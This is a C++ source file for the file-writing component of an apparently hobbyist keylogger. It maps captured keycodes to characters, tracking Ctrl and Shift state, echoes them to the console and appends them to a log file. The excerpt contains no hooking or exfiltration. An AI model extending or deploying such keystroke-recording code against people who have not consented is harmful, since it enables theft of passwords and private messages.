#include "FileLogger.h"

namespace Keylogger {

bool FileLogger::open(IKeycodeMapper* mapper, std::string filename) {
    _mapper = mapper;
    _stream.open(filename, std::ios_base::app);

    return _stream.is_open();
}

void FileLogger::close() {
    _stream.close();
}

void FileLogger::logKeycode(int keycode, KeyState state) {
    if (_mapper) {
        if (_mapper->isCtrl(keycode)) {
            modifierCtrl = state == KeyState::Pressed;
        }
        if (_mapper->isShift(keycode)) {
            modifierShift = state == KeyState::Pressed;
        }

        if (state == KeyState::Pressed) {
            std::cout << _mapper->keycodeToStr(keycode, modifierShift) << std::endl;
            _stream << _mapper->keycodeToStr(keycode, modifierShift);
        }
    } else {
        _stream << keycode << ":" << (state == KeyState::Pressed ? 1 : 0) << " ";
    }
}

}
